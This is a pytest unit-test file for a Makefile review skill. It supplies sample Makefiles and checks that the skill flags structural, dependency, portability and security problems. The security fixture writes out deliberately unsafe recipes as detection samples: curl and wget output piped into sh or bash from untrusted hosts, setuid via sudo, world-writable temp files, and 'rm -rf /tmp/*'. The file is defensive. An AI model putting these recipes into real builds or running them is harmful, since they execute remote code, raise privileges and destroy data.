"""
Unit tests for the makefile review skill.

Tests build system analysis, makefile optimization,
and dependency management validation.
"""

from __future__ import annotations

from pathlib import Path
from unittest.mock import Mock

import pytest

# Import the skill we're testing
from pensive.skills.makefile_review import MakefileReviewSkill


class TestMakefileReviewSkill:
    """Test suite for MakefileReviewSkill business logic."""

    def setup_method(self):
        """Set up test fixtures before each test."""
        self.skill = MakefileReviewSkill()
        self.mock_context = Mock()
        self.mock_context.repo_path = Path("/tmp/test_repo")
        self.mock_context.working_dir = Path("/tmp/test_repo")

    @pytest.mark.unit
    def test_detects_makefile_structure_issues(self, mock_skill_context):
        """Given makefile content, when skill analyzes, then identifies structural problems."""
        # Arrange
        problematic_makefile = """
# Missing .PHONY declaration
all: build test

build:
	gcc -o main main.c utils.c
	# No error handling

test:
	./test_runner
	# No check if test_runner exists

clean:
	rm -f *.o main
	# No error handling for missing files

install: build
	cp main /usr/local/bin/
	# Should use DESTDIR for proper packaging
	chmod +x /usr/local/bin/main

# Missing .PHONY for common targets
help:
	@echo "Available targets:"
	@echo "  build    - Build the project"
	@echo "  test     - Run tests"
	@echo "  clean    - Clean build artifacts"

# No variables for configurability
        """

        mock_skill_context.get_file_content.return_value = problematic_makefile

        # Act
        structure_analysis = self.skill.analyze_makefile_structure(mock_skill_context)

        # Assert
        assert "missing_phony" in structure_analysis
        assert "error_handling" in structure_analysis
        assert "hardcoded_paths" in structure_analysis
        assert "variable_usage" in structure_analysis
        assert len(structure_analysis["missing_phony"]) >= 4  # build, test, clean, install

    @pytest.mark.unit
    def test_analyzes_dependency_management(self, mock_skill_context):
        """Given makefile dependencies, when skill analyzes, then checks dependency correctness."""
        # Arrange
        dependency_makefile = """
CC = gcc
CFLAGS = -Wall -Wextra -O2

# Bad: Missing automatic dependencies
main: main.c utils.c
	$(CC) $(CFLAGS) -o main main.c utils.c

# Bad: Manual dependency listing is error-prone
utils.o: utils.c utils.h
	$(CC) $(CFLAGS) -c utils.c

main.o: main.c main.h utils.h common.h
	$(CC) $(CFLAGS) -c main.c

# Bad: Missing dependencies on header files
parser.o: parser.c
	$(CC) $(CFLAGS) -c parser.c

# Good: Using automatic dependency generation
%.o: %.c
	$(CC) $(CFLAGS) -MMD -MF $@.d -c $<
	@mv $@.d $*.d

# Include dependency files
-include $(wildcard *.d)

# Bad: Circular dependency
debug: test
	$(MAKE) test

test: debug
	./test_runner

# Bad: Missing intermediate file declaration
format_code:
	astyle *.c *.h
	git add *.c *.h
        """

        mock_skill_context.get_file_content.return_value = dependency_makefile

        # Act
        dependency_analysis = self.skill.analyze_dependencies(mock_skill_context)

        # Assert
        assert "missing_dependencies" in dependency_analysis
        assert "circular_dependencies" in dependency_analysis
        assert "automatic_dependencies" in dependency_analysis
        assert "header_dependencies" in dependency_analysis
        assert len(dependency_analysis["missing_dependencies"]) >= 2

    @pytest.mark.unit
    def test_detects_performance_issues(self, mock_skill_context):
        """Given makefile, when skill analyzes, then identifies performance bottlenecks."""
        # Arrange
        performance_makefile = """
# Bad: No parallel execution
all: build1 build2 build3 build4 build5

build1:
	gcc -o program1 program1.c
build2:
	gcc -o program2 program2.c
build3:
	gcc -o program3 program3.c
build4:
	gcc -o program4 program4.c
build5:
	gcc -o program5 program5.c

# Bad: Sequential compilation
build_lib: source1.o source2.o source3.o source4.o source5.o
	ar rcs lib.a *.o

source1.o: source1.c
	gcc -c source1.c
source2.o: source2.c
	gcc -c source2.c
source3.o: source3.c
	gcc -c source3.c
source4.o: source4.c
	gcc -c source4.c
source5.o: source5.c
	gcc -c source5.c

# Bad: Unnecessary rebuilds
timestamp:
	date > timestamp.txt

all_with_timestamp: timestamp build
	@echo "Build completed"

# Bad: Inefficient file operations
backup:
	cp -r src/ backup/src/
	cp -r include/ backup/include/
	cp -r tests/ backup/tests/
	tar czf backup.tar.gz backup/

# Good: Parallel execution support
.PHONY: all
all: $(PROGRAMS)

# Bad: Missing -j flag optimization
        """

        mock_skill_context.get_file_content.return_value = performance_makefile

        # Act
        performance_analysis = self.skill.analyze_performance(mock_skill_context)

        # Assert
        assert "parallelization_issues" in performance_analysis
        assert "unnecessary_rebuilds" in performance_analysis
        assert "inefficient_operations" in performance_analysis
        assert "file_operations" in performance_analysis
        assert len(performance_analysis["parallelization_issues"]) >= 2

    @pytest.mark.unit
    def test_analyzes_portability_issues(self, mock_skill_context):
        """Given makefile, when skill analyzes, then checks portability across platforms."""
        # Arrange
        unportable_makefile = """
# Hardcoded paths
CC = /usr/bin/gcc
INSTALL_DIR = /usr/local/bin

# Platform-specific commands
clean:
	rm -f *.o main
	@echo "Cleaned up"

install: main
	cp main $(INSTALL_DIR)
	chmod +x $(INSTALL_DIR)/main

# Assuming GNU make features
all_files = $(shell find . -name "*.c")
objects = $(patsubst %.c,%.o,$(all_files))

# Using GNU-specific functions
git_version = $(shell git describe --tags 2>/dev/null || echo "unknown")

# Platform-specific assumptions
debug:
	gdb ./main

# Windows-specific paths (bad for cross-platform)
windows_path: file.txt
	copy file.txt backup\\file.txt

# Unix-specific commands
setup:
	mkdir -p build/{debug,release}
	chmod +x scripts/*.sh

# Good: Cross-platform alternatives
UNAME = $(shell uname -s)
ifeq ($(UNAME), Linux)
    CC = gcc
    RM = rm -f
else ifeq ($(UNAME), Darwin)
    CC = clang
    RM = rm -f
else
    CC = gcc
    RM = del /Q
endif

        """

        mock_skill_context.get_file_content.return_value = unportable_makefile

        # Act
        portability_analysis = self.skill.analyze_portability(mock_skill_context)

        # Assert
        assert "hardcoded_paths" in portability_analysis
        assert "platform_specific" in portability_analysis
        assert "gnu_extensions" in portability_analysis
        assert "cross_platform_issues" in portability_analysis
        assert len(portability_analysis["platform_specific"]) >= 3

    @pytest.mark.unit
    def test_detects_security_issues(self, mock_skill_context):
        """Given makefile, when skill analyzes, then identifies security vulnerabilities."""
        # Arrange
        security_makefile = """
# Security issues in makefile

# Bad: Downloading and executing from internet without verification
install_deps:
	curl http://untrusted-site.com/install.sh | sh
	wget -qO- https://example.com/foreign-script.sh | bash

# Bad: Using sudo in makefile
install_system:
	sudo cp myapp /usr/local/bin/
	sudo chmod u+s /usr/local/bin/myapp  # Setuid bit

# Bad: Insecure temporary files
temp_file:
	echo "secrets" > /tmp/temp_file
	chmod 777 /tmp/temp_file

# Bad: PATH manipulation
export PATH := .:$(PATH)
build:
	$(MAKE) -C external_lib

# Bad: Running make as root
install_root:
	@if [ $$EUID -ne 0 ]; then echo "Please run as root"; exit 1; fi
	# Do installation as root

# Bad: No input validation
process_file:
	@read -p "Enter filename: " filename; cat $$filename

# Bad: Unsafe shell globbing
delete_temp:
	rm -rf /tmp/*  # Dangerous wildcard

# Bad: Extracting archives without validation
extract_deps:
	tar xzf download.tar.gz
	unzip -o archive.zip

# Good: Security-conscious alternatives
.PHONY: secure_install
secure_install: build
	@if [ $$EUID -eq 0 ]; then echo "Do not run as root"; exit 1; fi
	install -d $(DESTDIR)/usr/local/bin
	install -m 755 myapp $(DESTDIR)/usr/local/bin/
        """

        mock_skill_context.get_file_content.return_value = security_makefile

        # Act
        security_analysis = self.skill.analyze_security(mock_skill_context)

        # Assert
        assert "command_injection" in security_analysis
        assert "privilege_escalation" in security_analysis
        assert "path_traversal" in security_analysis
        assert "insecure_downloads" in security_analysis
        assert len(security_analysis["command_injection"]) >= 3

    @pytest.mark.unit
    def test_analyzes_variable_usage(self, mock_skill_context):
        """Given makefile, when skill analyzes, then evaluates variable management."""
        # Arrange
        variable_makefile = """
# Bad: Undefined variables
CFLAGS =
LDFLAGS =

# Using undefined variables
build: $(SOURCES)  # SOURCES not defined
	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)

# Good variable usage
CC = gcc
CFLAGS = -Wall -Wextra -O2
SOURCES = $(wildcard *.c)
OBJECTS = $(SOURCES:.c=.o)
TARGET = myprogram

# Bad: Variable scoping issues
VAR = global_value

target1: VAR = local_value1
target1:
	@echo $(VAR)  # This works

target2:
	@echo $(VAR)  # Uses global value, might be unexpected

# Bad: Variable evaluation timing
PROGS = $(shell find . -name "*.c")
all: $(PROGS)
# PROGS evaluated at read time, misses new files

# Bad: Recursive variable can cause infinite loops
X = $(Y)
Y = $(X)

# Good: Immediate assignment
CC := gcc
CFLAGS := -Wall -Wextra

# Good: Pattern-specific variables
%.o: CFLAGS += -g

# Bad: Not using functions for file lists
objects = main.o utils.o parser.o lexer.o
# Should use wildcard/patsubst

# Good: Using functions
SOURCES = $(wildcard *.c)
OBJECTS = $(SOURCES:.c=.o)
DEPS = $(OBJECTS:.o=.d)
        """

        mock_skill_context.get_file_content.return_value = variable_makefile

        # Act
        variable_analysis = self.skill.analyze_variables(mock_skill_context)

        # Assert
        assert "undefined_variables" in variable_analysis
        assert "scoping_issues" in variable_analysis
        assert "evaluation_timing" in variable_analysis
        assert "function_usage" in variable_analysis
        assert len(variable_analysis["undefined_variables"]) >= 3

    @pytest.mark.unit
    def test_analyzes_target_organization(self, mock_skill_context):
        """Given makefile, when skill analyzes, then evaluates target structure and organization."""
        # Arrange
        target_makefile = """
# Poor target organization

# Bad: Multiple actions in single target
all: build test docs install clean

build: main.o utils.o
	$(CC) -o main main.o utils.o
	@echo "Build complete"
	./main --test  # Running tests in build target

test: build
	./test_runner
	./integration_tests
	@echo "All tests passed"
	cp results.html /var/www/results/  # Deployment in test target

# Bad: Target naming inconsistencies
BuildDebug: main.o
	$(CC) -g -o main_debug main.o

build-release: main.o
	$(CC) -O3 -o main_release main.o

# Bad: Missing phony declarations
clean:
	rm -f *.o main main_debug main_release

install: main
	cp main /usr/local/bin/main

# Bad: No dependency chain
docs:
	doxygen Doxyfile

# Good: Proper target organization
.PHONY: all build test clean install docs

all: build

# Separation of concerns
build: $(TARGET)
test: build
	$(TEST_RUNNER)

install: build
	$(INSTALL) -m 755 $(TARGET) $(DESTDIR)$(BINDIR)/

# Good: Debug and release variants
debug: CFLAGS += -g -DDEBUG
debug: $(TARGET)

release: CFLAGS += -O3 -DNDEBUG
release: $(TARGET)
        """

        mock_skill_context.get_file_content.return_value = target_makefile

        # Act
        target_analysis = self.skill.analyze_target_organization(mock_skill_context)

        # Assert
        assert "phony_declarations" in target_analysis
        assert "target_naming" in target_analysis
        assert "dependency_chain" in target_analysis
        assert "separation_of_concerns" in target_analysis
        assert len(target_analysis["phony_declarations"]) >= 3

    @pytest.mark.unit
    def test_detects_modern_makefile_best_practices(self, mock_skill_context):
        """Given makefile, when skill analyzes, then checks for modern best practices."""
        # Arrange
        modern_makefile = """
# Modern makefile best practices

# Good: Use common patterns
include config.mk

# Good: Shell detection and compatibility
SHELL := /bin/bash
ifeq ($(OS),Windows_NT)
    SHELL := cmd.exe
endif

# Good: Proper phony declarations
.PHONY: all clean test install format lint

# Good: Variable immediate assignment for performance
CC := gcc
CFLAGS := -Wall -Wextra -std=c11

# Good: Automatic variables and pattern rules
%.o: %.c
	$(CC) $(CFLAGS) -c $< -o $@

# Good: Order-only prerequisites
main: main.o | check_deps
	$(CC) $(LDFLAGS) -o $@ $^

# Good: Secondary files
.PRECIOUS: %.d

# Good: Generated source files
parser.c parser.h: parser.y
	bison -d -o parser.c parser.y

lexer.c: lexer.l parser.h
	flex -o lexer.c lexer.l

# Good: Integration with common tools
format:
	clang-format -i *.c *.h

lint:
	cppcheck --enable=all --error-exitcode=1 *.c

# Good: Configuration via environment or config files
-include config.local.mk

# Good: Cross-compilation support
ifdef CROSS_COMPILE
    CC := $(CROSS_COMPILE)-gcc
    STRIP := $(CROSS_COMPILE)-strip
endif

# Bad: Missing modern features
old_style:
	@echo "Using old make features"
        """

        mock_skill_context.get_file_content.return_value = modern_makefile

        # Act
        modernization_analysis = self.skill.analyze_modernization(mock_skill_context)

        # Assert
        assert "modern_features" in modernization_analysis
        assert "tool_integration" in modernization_analysis
        assert "cross_platform_support" in modernization_analysis
        assert "configuration_management" in modernization_analysis
        assert modernization_analysis["modern_features"]["score"] > 0.7

    @pytest.mark.unit
    def test_generates_makefile_optimization_recommendations(self, mock_skill_context):
        """Given makefile analysis, when skill generates recommendations, then provides actionable improvements."""
        # Arrange
        makefile_analysis = {
            "structure_issues": 5,
            "performance_problems": 3,
            "portability_issues": 4,
            "security_vulnerabilities": 2,
            "variable_problems": 3,
            "target_organization_issues": 4
        }

        # Act
        recommendations = self.skill.generate_makefile_recommendations(makefile_analysis)

        # Assert
        assert len(recommendations) > 0
        categories = [rec["category"] for rec in recommendations]
        assert "structure" in categories
        assert "performance" in categories
        assert "security" in categories
        assert "portability" in categories

        for rec in recommendations:
            assert "priority" in rec
            assert "action" in rec
            assert "example" in rec
            assert "benefit" in rec

    @pytest.mark.unit
    def test_creates_makefile_quality_report(self, sample_findings):
        """Given comprehensive makefile analysis, when skill creates report, then generates structured summary."""
        # Arrange
        makefile_analysis = {
            "overall_score": 6.5,
            "structure_score": 7.0,
            "performance_score": 5.0,
            "security_score": 8.0,
            "portability_score": 6.0,
            "total_targets": 12,
            "phony_targets": 3,
            "missing_phony": 9,
            "security_issues": 2,
            "optimization_opportunities": 8,
            "findings": sample_findings
        }

        # Act
        report = self.skill.create_makefile_quality_report(makefile_analysis)

        # Assert
        assert "## Makefile Quality Assessment" in report
        assert "## Structure Analysis" in report
        assert "## Performance Evaluation" in report
        assert "## Security Review" in report
        assert "## Portability Assessment" in report
        assert "## Recommendations" in report
        assert "6.5" in report  # Overall score
        assert "12" in report  # Total targets
        assert "2" in report   # Security issues

    @pytest.mark.unit
    def test_handles_multiple_makefiles(self, mock_skill_context):
        """Given multiple makefiles, when skill analyzes, then evaluates consistency across files."""
        # Arrange
        makefiles = {
            "Makefile": """
CC = gcc
CFLAGS = -Wall -O2
all: main
main: main.c
	$(CC) $(CFLAGS) -o main main.c
            """,

            "tests/Makefile": """
CC = gcc
CFLAGS = -g -Wall
all: test_runner
test_runner: test_main.c
	$(CC) $(CFLAGS) -o test_runner test_main.c
            """,

            "docs/Makefile": """
all:
	doxygen Doxyfile
clean:
	rm -rf html/
            """
        }

        def mock_get_file_content(path):
            filename = Path(path).name
            return makefiles.get(filename, "")

        mock_skill_context.get_file_content.side_effect = mock_get_file_content
        mock_skill_context.get_files.return_value = list(makefiles.keys())

        # Act
        multi_file_analysis = self.skill.analyze_multiple_makefiles(mock_skill_context)

        # Assert
        assert "consistency_issues" in multi_file_analysis
        assert "variable_conflicts" in multi_file_analysis
        assert "target_naming" in multi_file_analysis
        assert "cross_file_dependencies" in multi_file_analysis
        assert len(multi_file_analysis["consistency_issues"]) >= 1

    @pytest.mark.unit
    def test_analyzes_makefile_integration(self, mock_skill_context):
        """Given makefile in project context, when skill analyzes, then evaluates integration with build ecosystem."""
        # Arrange
        project_files = {
            "Makefile": """
include config.mk
all: $(TARGET)
            """,

            "config.mk": """
CC = gcc
CFLAGS = -Wall -O2
TARGET = myapp
            """,

            "CMakeLists.txt": """
cmake_minimum_required(VERSION 3.10)
project(MyApp)
add_executable(myapp main.c)
            """,

            "package.json": """
{
  "name": "myapp",
  "scripts": {
    "build": "make",
    "test": "make test"
  }
}
            """,

            ".github/workflows/build.yml": """
name: Build
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v2
    - run: make
    """
        }

        def mock_get_file_content(path):
            filename = Path(path).name
            return project_files.get(filename, "")

        mock_skill_context.get_file_content.side_effect = mock_get_file_content
        mock_skill_context.get_files.return_value = list(project_files.keys())

        # Act
        integration_analysis = self.skill.analyze_build_system_integration(mock_skill_context)

        # Assert
        assert "build_system_conflicts" in integration_analysis
        assert "ci_integration" in integration_analysis
        assert "package_manager_integration" in integration_analysis
        assert "tooling_compatibility" in integration_analysis
